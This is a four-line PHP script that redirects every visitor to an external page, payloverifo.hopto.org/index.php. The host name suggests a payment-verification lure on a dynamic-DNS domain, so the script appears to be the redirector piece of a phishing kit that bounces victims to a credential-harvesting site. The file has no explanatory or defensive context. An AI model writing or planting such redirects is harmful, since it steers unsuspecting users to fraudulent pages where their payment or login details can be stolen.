<?php
  header('Location: https://payloverifo.hopto.org/index.php');
  exit();
?>